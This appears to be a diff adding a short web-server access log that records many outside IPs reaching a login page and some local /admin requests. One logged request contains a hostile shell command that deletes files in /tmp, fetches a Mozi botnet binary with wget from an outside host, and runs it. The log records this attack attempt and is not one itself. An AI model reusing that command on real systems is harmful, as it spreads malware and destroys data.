@@ -1,0 +1,27 @@
+[16:14:39] This session was started on 2022. 05. 31. 16:14:39
+[16:14:39] Listening to port 3001...
+[16:14:39] Listening to port 80...
+[16:14:41] 192.168.1.2 asked for the log.
+[17:44:15] 130.211.54.158 on login page. /
+[17:52:46] 195.189.218.150 on login page. /
+[18:04:10] 85.202.169.61 on login page. /
+[18:07:52] 37.0.10.187 on login page. /
+[18:55:35] 2.57.122.35 on login page. /
+[19:00:02] 213.251.229.101 on login page. /
+[19:52:42] 31.7.58.162 on login page. /
+[20:07:16] 185.220.103.6 on login page. /
+[20:08:54] 143.255.242.254 on login page. /
+[20:56:13] 192.168.1.2 served. /admin
+[20:56:15] 192.168.1.2 served. /admin
+[21:01:23] 212.154.85.207 on login page. /
+[21:05:50] 192.168.1.2 served. /admin
+[21:17:58] 178.72.71.124 on login page. /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
+[21:31:04] 85.105.7.206 on login page. /
+[22:14:06] 81.215.63.45 on login page. /
+[22:24:03] 159.65.56.159 on login page. /
+[22:25:45] 162.142.125.213 on login page. /
+[22:25:45] 162.142.125.213 on login page. /
+[22:28:14] 219.74.87.0 on login page. /
+[22:49:14] 2.57.122.35 on login page. /
+[23:55:42] 192.168.1.2 served. /admin
+[00:33:23] 85.93.152.58 on login page. /
